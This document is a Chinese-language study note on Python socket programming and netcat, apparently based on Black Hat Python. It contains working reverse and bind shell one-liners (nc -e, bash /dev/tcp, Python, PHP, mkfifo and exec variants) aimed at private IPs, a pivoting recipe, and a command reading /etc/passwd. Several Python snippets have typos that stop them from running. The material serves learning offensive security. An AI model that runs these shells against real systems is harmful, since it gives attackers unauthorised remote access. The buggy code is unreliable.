# Python 网络编程

## 简介

Python的网络编程，都离不开`socket`模块

## TCP

### TCP客户端

TCP客户端常可用来：测试服务、发送垃圾数据、进行Fuzz

```python
# 导入socket包
import socket

# 配置目标服务器主机和端口号
target_host="www.google.com"
target_port="80"

# 创建一个socket对象
cli = socket.socket(socket.AF_INET, sockrt.SOCK_STREAM)  # AF.INET代表IPV4，SOCK_STREAM代表TCP，流

# 连接服务器
cli.connect(target_host,target_port)

# 发送函数
cli.send(b"GET / HTTP/1.1\r\nHOST: google.com\r\n\r\n")

# 接收函数
resp = cli.recv(4096)   # 4096为设置的接收的最大

print(resp.decode)     # 不解码将会以其他进制方式展示

# 关闭客户端
cli.close()
```

### TCP服务端

TCP服务端常可用来：远程代码执行工具、代理工具

```python
import socket
import threading   # 多线层模块

IP='0.0.0.0'   # 全开
PORT='9998'

def main():
  # 创建一个socket对象
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  # 绑定IP和端口
  s.bind(IP, PORT)
  # 开始监听
  s.listen(5)
  print(f'[*]Listening on {IP}:{PORT}')
  
  # 循环等待连接并处理
  while True:
    # 当成功建立连接
    cli, addr = s.accept()  # cli保存及诶收到客户端的socket对象，addr接收远程连接的详细信息
    print(f'[*]Accepted connection from {addr[0]}:{addr[1]}')
    # 创建一个新的线程，指向handle_client函数，并传入cli参数
    cli_handler = threading.Thread(target=handle_cli, args=(cli,))  # handle_cli为自己写的函数
    # 启动线程处理刚才收到的请求
    cli.handler.start()
    
def handle_cli(cli_socket):
  """
  处理函数，调用recv()
  """ 
  with cli_socket as sock:
    request = sock.recv(1024)
    print(f'[*]Received: {request.decode("utf-8")}')
    sock.send(b'ACK')
    
# main，仅在本节次执行
if __name__ = '__main__':
  main()
    
```

总结而言：

TCP客户端简单分为以下几个步骤（不考虑拥塞、异常等）：

* 创建socket对象 `socket.scoket()`
* 建立连接 `c.connect()`
* 发送数据`c.send()`
* 接收数据`c.recv()`

TCP服务端简单分为以下几个步骤（不考虑拥塞、异常等）：

* 创建socket对象`socket.socket()`
* 指定服务器应该要监听的IP和端口`s.bind()`
* 开始监听`s.listen()`
* 确认建立连接`s.accept()`
* 接收数据`s.recv()`



### UDP客户端

UDP是无连接协议，其`recvfrom()`函数不仅 返回接收到的数据，还会返回详细的数据来源信息（主机名和端口号）

```python
import socket
target_host = "127.0.0.1"
target_port = 9997

# create a socket object
cli = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

# send some data
cli.sendto(b"ABC",(target_host, target_port))

# receive some data
data, addr = cli.recvfrom(1024)

print(data.decode)
cli.close()
```

## Netcat

### NC的用法

* Netcat 瑞士军刀

* nc的速查表

  ```shell
  -c shell commands shell模式
  -e filename 程序重定向 [危险!!]
  -b 允许广播
  -d 无命令行界面,使用后台模式
  -g gateway 源路由跳跃点, 不超过8
  -G num 源路由指示器: 4, 8, 12, ...
  -h 获取帮助信息
  -i secs 延时设置,端口扫描时使用
  -k 设置在socket上的存活选项
  -l 监听入站信息
  -n 以数字形式表示的IP地址
  -o file 使进制记录
  -p port 本地端口
  -r 随机本地和远程的端口
  -q secs 在标准输入且延迟后退出（翻译的不是很好，后面实例介绍）
  -s addr 本地源地址
  -T tos 设置服务类型
  -t 以TELNET的形式应答入站请求
  -u UDP模式
  -v 显示详细信息 [使用=vv获取更详细的信息]
  -w secs 连接超时设置
  -z I/O 模式 [扫描时使用]
  ```

* nc的简单使用

  ```shell
  # 1. 抓取banner信息
  nc -nv [ip] [port]
  
  # 2. 连接远程主机
  nc nvv [ip][port]
  
  # 3. 端口扫描
  nc -v [ip][port]    nc -nvz ip 1-65535
  nc -v -z [ip][port]  # 扫描端口段 速度很慢
  
  # 4. 监听本地端口
  nc -lp 999
  
  # 5. 文件传输 -- 传输一个text.txt的文件
  nc -vn [ip][port] < text.txt -q 1   # 客户端
  # 监听，将接收到的数据放到1.txt  服务端 
  nc -lp 333 > 1.txt
  
  # 6. 会话
  nc -lp 999 # 服务端
  nc -nv 192.168.1.1 999 # 客户端
  ```

* nc获取正反Shell

  ```shell
  # 1. 正向连接 -- 攻击者连接，受害者监听 -- 用于机器不出网情况
  # 受害者 -- 监听
  nc -lvp 999 -e /bin/bash    # linux，-e还可以换成-c bash
  nc -lvp 999 -e c:\windows\system32\cmd.exe  # windows
  
  # 攻击者 -- 连接
  nc ip 999
  
  # 2. 反向shell -- 攻击者监听，受害者连接 -- 机器出网，一般用VPS，否则容易暴露
  # 攻击者 -- 监听
  nc -lvp 999
  
  # 受害者 -- 连接
  nc ip 999 -c bash
  ```

* nc的奇淫巧技

  ```shell
  # 1. Python的反向shell
  # 攻击者
  nc -lvp 999
  
  # 受害者 -- 没有nc，但是有python环境
  python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.136.129",2222));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
  ```

  ```shell
  # 2. bash反向shell
  # 攻击者
  nc -lvp 999
  
  # 受害者
  bash -i > & /dev/tcp/192.168.136.129/999 0>&1
  # 解释
  bash -i: 启动一个交互式的Bash shell。Bash是Unix-like系统上的一种常用的命令行解释器。> & /dev/tcp/192.168.136.129/999: 这部分将Bash的标准输出重定向到指定的IP地址（192.168.136.129）和端口号（999）。它利用了/dev/tcp虚拟文件系统中的特性，在某些Unix-like系统上，可以直接通过该虚拟文件系统与远程主机进行TCP连接。
  0>&1: 这部分将Bash的标准输入重定向到标准输出。这意味着，输入和输出都将通过与指定IP地址和端口的远程主机的TCP连接进行传输。
  ```

  ```shell
  # 3. php反向shell
  # 攻击者
  nc -lvp 3333
  
  # 受害者
  php -r '$sock=fsockopen("192.168.136.129",3333);exec("/bin/sh -i <&3 >&3 2>&3");'
  ```

  ```shell
  # 对于不支持nc -e参数，使用以下命令或使用其他版本nc
  攻击机：
  nc -lvp 1024
  目标机：
  nc.traditional 192.168.37.132 1024 -e /bin/sh
  ```

  ```shell
  # 配合命名管道进行反弹
  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1 | nc 192.168.37.132 1024 >/tmp/f
  # 解释
  1. rm /tmp/f：删除名为 /tmp/f 的文件（如果存在）。
  2. mkfifo /tmp/f：创建一个命名管道文件 /tmp/f。
  3. cat /tmp/f|/bin/sh -i 2>&1：通过命名管道文件读取输入，并将其作为命令输入给 /bin/sh，即启动一个交互式的 Shell。
  4. nc 192.168.37.132 1024 >/tmp/f：将标准输入的内容发送到 IP 地址为 192.168.37.132 的主机的 1024 端口，并将返回的输出重定向到 /tmp/f 文件中。
  ```

  ```shell
  # exec反弹shell
  0<&196;exec 196<>/dev/tcp/192.168.37.132/1024; sh <&196 >&196 2>&196
  # 解释
  1. 0<&196;：这部分表示将标准输入（stdin，文件描述符0）重定向到文件描述符196。文件描述符196在此被使用作为临时的输入流。
  2. exec 196<>/dev/tcp/192.168.37.132/1024;：这部分通过 exec 命令创建了一个新的文件描述符196，并将其关联到 /dev/tcp/192.168.37.132/1024 所表示的 TCP 套接字连接上。
  3. sh <&196 >&196 2>&196：这部分使用 sh 命令启动一个交互式 Shell。同时，使用文件描述符196将标准输入、标准输出和标准错误输出都重定向到与远程主机的 TCP 套接字连接关联的输入流和输出流上。
  ```

* nc内网代理

  ```shell
  # 场景：kali无法访问数据库服务器，但是可以访问web服务器
  # 通过web来做一次代理转发
  
  # kali
  nc -lvp 3333
  # 数据库 -- 不出网
  nc -lvp 3333 -e /bin/sh
  # web服务器
  nc -v [kali ip] 3333 -c "nc -v [数据库ip] 3333"
  # 解释
  这个命令的作用是在本地主机和kali 主机之间建立一个连接，并将从本地主机发送到 kali 的数据转发到数据库 主机的 3333 端口。
  ```

* 参考链接

  [1.nc使用指南](https://www.jianshu.com/p/cb26a0f6c622)

  [2. nc使用-freebuf](https://www.freebuf.com/sectool/243115.html)

  [3. nc应用一检测端口开闭](https://developer.aliyun.com/article/876069)



  ### netcat.py

编写一个nc工具，使用`python`

代码请参考`nc`文件夹内文件

现在我们来看一下使用过程：

* `-h` 使用帮助

  `python3 netcat.py -h`或者`python3 netcat.py --help`

  ```shell
  xxx@xxx nc % python3 netcat.py -h
  usage: netcat.py [-h] [-c] [-e EXECUTE] [-l] [-p PORT] [-t TARGET] [-u UPLOAD]
  
  BHP Net Tool
  
  optional arguments:
    -h, --help            show this help message and exit
    -c, --command         command shell
    -e EXECUTE, --execute EXECUTE
                          execute specified command
    -l, --listen          listen
    -p PORT, --port PORT  specified port
    -t TARGET, --target TARGET
                          specified ip
    -u UPLOAD, --upload UPLOAD
                          upload file
  
  Example:
              netcat.py -t 192.168.1.108 -p 555 -l -c   # command shell
              netcat.py -t 192.168.1.108 -p 555 -l -u=mytest.txt   # upload to file
              netcat.py -t 192.168.1.108 -p 555 -l -e="cat /etc/passwd"  # execute command
              echo 'ABC' | ./netcat/py -t 192.168.1.1 -p 999 # echo text to server port 999
              netcat.py -t 192.168.1.1 -p 5555 # connect to server
  ```

  

* 服务端 `-l -p`

  `python3 netcat.py -t 127.0.0.1 -p 999 -l -c`

* 客户端

  ``python3 netcat.py -t 127.0.0.1 -p 999 ``

**补充：**

这里补充一下，自己犯的错误，真的该打

```python
        try:
            while True:    # 大循环，对数据进行接收，以4096为单位，小于直接接收；大于则以4096分段接收
                recv_len = 1
                response = ''
                while recv_len:
                    data = self.socket.recv(4096)
                    recv_len = len(data)
                    response += data.decode()
                    if recv_len < 4096:      # 退出循环的条件
                        break

                if response:     # 外循环，否则可能就执行不到这个了
                    print(response)
                    buffer = input(f'{self.args.target}@ $ > ')  # 输出完response内容，暂停等待用户的输入才继续
                    buffer += '\n'
                    self.socket.send(buffer.encode())    # 发送出用户输入的新内容，进行下一轮新循环
        except KeyboardInterrupt:    # 按下ctr+c就退出循环
            print('User terminated.')
            self.socket.close()
            sys.exit()
            
# ============================================================
被我错误❎成了

while recv_len:
                    data = self.socket.recv(4096)
                    recv_len = len(data)
                    response += data.decode()
                    if recv_len < 4096:      # 退出循环的条件
                        break

                    if response:     # 外循环，否则可能就执行不到这个了
                       print(response)
                       ...
                     
 # 这将导致无限死循环
```



**评价**：

* 不好用，代码根本没有考虑网络编程中的一些出现的问题，拥塞、堵塞、异常统统没细考虑
* 没有nc那样智能，可以正向shell或者反向shell，这个只能单通信
* 虽然功能简单：命令执行、上传文件、shell，但是对小白理解`简单版netcat`很有用
* 可以魔改，目前还没想到，先学习



## TCP代理

### TCP代理作用

* 在主机之间转发流量
* 检测一些网络软件
* 分析未知协议
* 篡改应用的网络流量
* 为Fuzzer创建测试用例

使用场景：无法使用Wireshark，无法在windows上加兹安驱动嗅探本地回环流量



### TCP代理需求分析

1. 把本地设备和远程设备之间的通信过程显示到屏幕上（hexdump函数）
2. 从本地设备或远程设备的入口socket接收数据（receive_from函数）
3. 控制远程设备和本地设备之间的流量方向（proxy_handler函数）
4. 监听socket，并把传递给proxy_handler (server_loop函数)



### TCP代理：`proxy.py`



